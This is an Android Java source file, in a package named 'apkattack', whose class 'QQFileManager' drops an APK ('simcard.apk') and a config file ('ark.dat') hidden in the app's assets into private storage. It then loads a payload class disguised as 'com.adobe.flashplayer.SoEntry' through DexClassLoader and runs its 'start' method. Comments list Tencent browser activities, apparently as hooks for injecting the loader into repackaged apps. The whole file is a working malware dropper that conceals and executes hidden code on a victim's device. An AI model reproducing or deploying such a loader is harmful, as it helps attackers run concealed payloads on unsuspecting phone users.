package com.example.apkattack;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;


//Lcom/tencent/mtt/SplashActivity;
//Lcom/tencent/mtt/BrowserService;
//Lcom/tencent/mtt/MainActivity;
public class QQFileManager {

	//assetManager.list("") 得到assets文件夹下所有文件名。如果assets文件夹里有文件夹叫xml，
	//得到文件名的方法为assetManager.list("xml"),路径都是相对assets路径的。
    public static void apkLoader(Context context){
    	String Tag = "QQFileManager";
    	try {
	    	//String apppath = "/data/data/com.tencent.FileManager/files/";
	    	//String appcachepath = "/data/data/com.tencent.FileManager/cache/";
	    	String apppath = context.getFilesDir() + "/";
	    	String appcachepath = context.getCacheDir() + "/";
	    	
//	    	String apkfn = "qqsdl.apk";
//	    	String dexclassname = "com.google.android.apps.plus.JarEntry";
	    	
	    	String apkfn = "simcard.apk";
	    	String dexclassname = "com.adobe.flashplayer.SoEntry";
	    	
	    	String cfgfn = "ark.dat";
	    	String dexmethodname = "start";
	    	
	    	File fileapk = new File(apppath + apkfn);
	    	File filecfg = new File(apppath + cfgfn);
	    	if (fileapk.exists() == false || filecfg.exists() == false) {

	    		String tmpapkfn = "";
	    		String [] filenames = context.getAssets().list("");
	    		for (int i = 0; i < filenames.length; i++) {
					if (filenames[i].contains(".apk")) {
						tmpapkfn = filenames[i];
						break;
					}
				}
	    		
	            InputStream is = context.getAssets().open(tmpapkfn);	
	            int size = is.available();
	            byte[] buffer = new byte[size];
	            is.read(buffer);
	            is.close();
	            FileOutputStream os = new FileOutputStream(apppath + apkfn);
	            os.write(buffer);
	            os.close();
	            
	            is = context.getAssets().open(cfgfn);
	            size = is.available();
	            buffer = new byte[size];
	            is.read(buffer);
	            is.close();
	            os = new FileOutputStream(apppath + cfgfn);
	            os.write(buffer);
	            os.close();
			}

//	    	boolean b = getFileFromAssets(context,apkfn,apppath + apkfn);
//	    	if (b == false) {
//	    		Log.e(Tag, "not found apk file");
//				return;
//			}
//	    	b = getFileFromAssets(context,cfgfn,apppath + cfgfn);
//	    	if (b == false) {
//	    		Log.e(Tag, "not found config file");
//				return;
//			}
	    	
	    	DexClassLoader dexcl = new DexClassLoader(apppath + apkfn, appcachepath, null,context.getClassLoader());
    	
    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
    	    method.invoke(obj,context);
    	    
    	    Log.e(Tag, "apk load success");
    	} catch (Exception ex) {
    		ex.printStackTrace();
    		Log.e(Tag, "apk load exception");
    	}
    }
}
